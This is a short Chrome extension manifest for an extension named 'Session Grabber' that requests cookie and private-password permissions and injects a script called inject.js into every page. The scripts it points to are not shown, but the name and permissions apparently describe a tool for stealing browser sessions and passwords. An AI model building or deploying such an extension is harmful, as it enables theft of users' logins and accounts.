{
  "manifest_version": 3,
  "name": "Session Grabber",
  "version": "1.0",
  "permissions": ["cookies", "passwordsPrivate", "activeTab"],
  "background": {
    "service_worker": "bg.js"
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["inject.js"],
      "run_at": "document_end"
    }
  ]
}